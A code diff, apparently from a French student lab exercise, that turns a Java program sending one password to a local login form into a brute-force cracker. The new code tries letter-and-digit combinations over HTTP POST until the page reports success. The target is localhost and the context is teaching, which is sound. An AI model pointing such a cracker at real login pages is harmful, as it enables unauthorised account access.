@@ -9,22 +9,71 @@ import java.net.URLEncoder;
 
 public class Exercice {
     public static void main(String[] args) {
-        try {
-            // URL de la page contenant le formulaire
-            URL url = new URL("http://localhost/tp2/motDePasse.html");
+        runBruteForceAttack();
+    }
 
-            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
-            System.out.print("Entrez le mot de passe : ");
-            String password = reader.readLine();
+    public static void runBruteForceAttack() {
+        String url = "http://localhost/tp2Copie/motDePasse.html";
+        String expectedPassword = "passer";
+
+        BruteForceCracker cracker = new BruteForceCracker(url, expectedPassword);
+        cracker.crackPassword();
+    }
+}
+
+class BruteForceCracker {
+    private static final String CHARACTER_SET = "abcdefghijklmnopqrstuvwxyz0123456789";
+    private String url;
+    private String expectedPassword;
+    private boolean passwordFound;
+
+    public BruteForceCracker(String url, String expectedPassword) {
+        this.url = url;
+        this.expectedPassword = expectedPassword;
+        this.passwordFound = false;
+    }
+
+    public void crackPassword() {
+        long startTime = System.currentTimeMillis();
+
+        while (!passwordFound) {
+            for (int length = 1; length <= expectedPassword.length(); length++) {
+                generatePasswords("", length);
+            }
+        }
+
+        long endTime = System.currentTimeMillis();
+        long elapsedTime = endTime - startTime;
+        System.out.println("Mot de passe trouvé : " + expectedPassword);
+        System.out.println("Temps écoulé : " + elapsedTime + " millisecondes");
+    }
+
+    private void generatePasswords(String currentPassword, int length) {
+        if (passwordFound) {
+            return;
+        }
+
+        if (currentPassword.length() == length) {
+            if (sendRequest(currentPassword)) {
+                passwordFound = true;
+            }
+        }
+
+        for (int i = 0; i < CHARACTER_SET.length(); i++) {
+            char c = CHARACTER_SET.charAt(i);
+            generatePasswords(currentPassword + c, length);
+        }
+    }
+
+    private boolean sendRequest(String password) {
+        try {
+            URL requestURL = new URL(url);
 
             // Paramètre du formulaire
-            String param1 = password;
-
-            // Création des données à envoyer
-            String postData = "passwordInput=" + URLEncoder.encode(param1, "UTF-8");
+            String postData = "passwordInput=" + URLEncoder.encode(password, "UTF-8");
 
             // Ouverture de la connexion HTTP
-            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            HttpURLConnection conn = (HttpURLConnection) requestURL.openConnection();
             conn.setDoOutput(true);
             conn.setRequestMethod("POST");
             conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
@@ -45,16 +94,10 @@ public class Exercice {
             responseReader.close();
 
             // Vérification de la réponse du serveur
-            if (password.equals("passer") && response.toString().contains("Authentification réussie")) {
-                System.out.println("Authentification réussie !");
-            } else {
-                System.out.println("Erreur d'authentification.");
-            }
-
-            // Fermeture de la connexion
-            conn.disconnect();
+            return response.toString().contains("Authentification réussie");
         } catch (IOException e) {
             e.printStackTrace();
+            return false;
         }
     }
 }
